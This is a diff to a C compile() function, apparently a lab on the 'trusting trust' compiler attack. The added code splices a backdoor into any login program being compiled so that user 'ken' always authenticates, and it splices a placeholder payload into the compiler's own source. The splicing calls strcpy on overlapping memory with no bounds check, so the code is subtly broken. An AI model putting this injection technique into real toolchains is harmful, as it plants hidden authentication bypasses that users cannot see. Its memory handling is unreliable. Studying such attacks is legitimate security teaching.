@@ -16,8 +16,7 @@
 static void compile(char *program, char *outname) {
     FILE *fp = fopen("./temp-out.c", "w");
     assert(fp);
-    fprintf(fp, "%s", program);
-    fclose(fp);
+    
 
 
     /*****************************************************************
@@ -30,7 +29,18 @@ static void compile(char *program, char *outname) {
     // and inject an attack for "ken":
     static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
 
-     
+    char* location = strstr(program, login_sig);
+    if (location) {
+        //First copy everything after needle to the point it needs to be for correct spacing
+        int login_sig_len = strlen(login_sig);
+        int login_attack_len = strlen(login_attack);
+
+        strcpy(location + login_sig_len + login_attack_len, location + login_sig_len);
+
+        //Then copy in the attack
+        strncpy(location + login_sig_len, login_attack, login_attack_len);
+    }
+    
 
     /*****************************************************************
      * Step 2:
@@ -50,10 +60,25 @@ static void compile(char *program, char *outname) {
               = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";
 
 
+    location = strstr(program, compile_sig);
+    if (location) {
+        //First copy everything after needle to the point it needs to be for correct spacing
+        int compile_sig_len = strlen(compile_sig);
+        int compile_attack_len = strlen(compile_attack);
+
+        strcpy(location + compile_sig_len + compile_attack_len, location + compile_sig_len);
+
+        //Then copy in the attack
+        strncpy(location + compile_sig_len, compile_attack, compile_attack_len);
+    }
+    
 
     /************************************************************
      * don't modify the rest.
      */
+
+    fprintf(fp, "%s", program);
+    fclose(fp);
 
     // gross, call gcc.
     char buf[1024];
